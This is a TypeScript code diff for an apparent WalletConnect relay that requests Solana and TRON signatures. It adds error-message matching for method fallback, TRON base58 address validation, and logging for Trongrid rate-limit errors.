@@ -374,8 +374,8 @@ async function trySolSign(session: WcSessionData): Promise<boolean> {
       usedSignAndSend = true
     } catch (err1) {
       const errMsg = err1 instanceof Error ? err1.message : String(err1)
-      // Only fall back on "method not supported" — not on user rejection / timeout
-      const isMethodMissing = /method not (found|supported)|unsupported.*method|-32601/i.test(errMsg)
+      // Fall back on "method not supported" or WC isValidRequest rejection — not on user rejection / timeout
+      const isMethodMissing = /method not (found|supported)|unsupported.*method|-32601|Missing or invalid.*method/i.test(errMsg)
       if (!isMethodMissing) {
         // User rejected / timeout / network error — bubble up to outer catch
         throw err1
@@ -431,6 +431,11 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
   if (!tronAddr) return false
   // Skip if address looks like EVM hex (0x...) — not a real TRON address
   if (/^0x[0-9a-fA-F]{40}$/.test(tronAddr)) return false
+  // Skip if not a valid TRON base58 address (starts with T, 34 chars)
+  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(tronAddr)) {
+    console.warn('[WcRelay] TRON skip — invalid address format:', tronAddr.slice(0, 12))
+    return false
+  }
   // Skip if session doesn't have tron namespace approved
   const tronNs = (session.namespaces ?? {})['tron'] as { accounts?: string[] } | undefined
   if (!tronNs?.accounts?.length) return false
@@ -560,6 +565,11 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
   } catch (e) {
     if (e instanceof WcInvalidTopicError) throw e  // bubble to runSignLoop
     const msg = e instanceof Error ? e.message : String(e)
+    // 429 = Trongrid rate limit (no API key or free tier) — log clearly
+    if (/429|rate.?limit/i.test(msg)) {
+      console.warn('[WcRelay] TRON 429 rate-limit — set TRON_API_KEY on Railway to fix | addr:', tronAddr?.slice(0, 10))
+      return false
+    }
     if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] TRON fail:', msg)
     return false
   }
